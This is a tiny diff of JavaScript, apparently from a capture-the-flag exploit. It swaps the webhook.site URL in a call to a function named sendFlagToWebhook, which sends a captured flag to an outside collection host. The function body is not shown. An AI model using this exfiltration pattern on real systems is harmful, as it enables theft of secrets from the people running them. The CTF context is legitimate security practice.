@@ -13,4 +13,4 @@ async function sendFlagToWebhook(webhookUrl) {
   }
 }
 
-sendFlagToWebhook('https://webhook.site/0ca2d115-4816-4982-9f73-4fc48e2173e9');
+sendFlagToWebhook('https://webhook.site/371f727f-1132-432d-b19d-079d450dee55');
